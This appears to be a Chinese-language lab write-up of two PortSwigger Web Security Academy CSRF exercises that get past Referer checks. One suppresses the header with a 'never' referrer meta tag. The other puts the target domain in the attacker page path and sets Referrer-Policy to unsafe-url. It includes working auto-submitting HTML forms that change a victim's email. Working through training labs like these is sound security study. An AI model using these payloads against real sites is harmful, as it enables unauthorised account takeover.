## Referer 的验证取决于头部是否存在

实验：CSRF 攻击，其中 Referer 验证依赖于头部存在
https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present

登录的响应为
Set-Cookie: session=fuQP8cXd8bPuzVI6HhpGc4ad2Y3GiGiD; Secure; HttpOnly; SameSite=None
解除samesite限制

更改登录功能的post中仅使用会话cookie

若直接使用概念验证则返回
HTTP/2 400 Bad Request

"Invalid referer header"

使用 referrer 的 content="never"属性值，禁止所有请求发送referer
```html
<meta name="referrer" content="never">
<form action="https://0ace008d04f49af680081cc2004900ab.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="aaaaaaaaaaa&#64;aa" />
    <input type="submit" value="Submit request" />
</form>
<script>
    history.pushState('', '', '/');
    document.forms[0].submit();
</script>
```

## 验证 Referer 可以被绕过

实验：带有损坏 Referer 验证的 CSRF
https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken

登录的响应为
Set-Cookie: session=aOIK86ObR9eqgQg6shjXaGbCj3z02GBL; Secure; HttpOnly; SameSite=None
解除samesite限制

更改登录功能的post中仅使用会话cookie

若直接使用概念验证则返回
HTTP/2 400 Bad Request

"Invalid referer header"

在重复器中更改Referer头部则成功修改
Referer: https://exploit-0a6e001f030231ac80dc11c301a8004f.exploit-server.net/?csrf=0a8e000503c1315e808012f2002d0018.web-security-academy.net

将目标的源url添加到控制页面的路径后，浏览器发出的请求已经去掉了url查询参数

在页面的响应头部中设置：
Referrer-Policy: unsafe-url
确保发送完整路径

如果设置页面路径为
/exploit?csrf=0a8e000503c1315e808012f2002d0018.web-security-academy.net
则受害者访问时将在最后自动加 / 使其成为文件，而不是参数

修改为路径名称
/exploit/csrf=0a8e000503c1315e808012f2002d0018.web-security-academy.net/
成功

```html
<html>
  <body>
    <form action="https://0a8e000503c1315e808012f2002d0018.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="erherher&#64;aa" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
        //  若保留burp自动概念验证的 history.pushState('', '', '/'); 则将覆盖设定的url查询参数
      document.forms[0].submit();
    </script>
  </body>
</html>

```

示例解决方案为：
在访问控制页面时，使用脚本将当前url改为拥有查询字符串参数的url
history.pushState("", "", "/?YOUR-LAB-ID.web-security-academy.net")

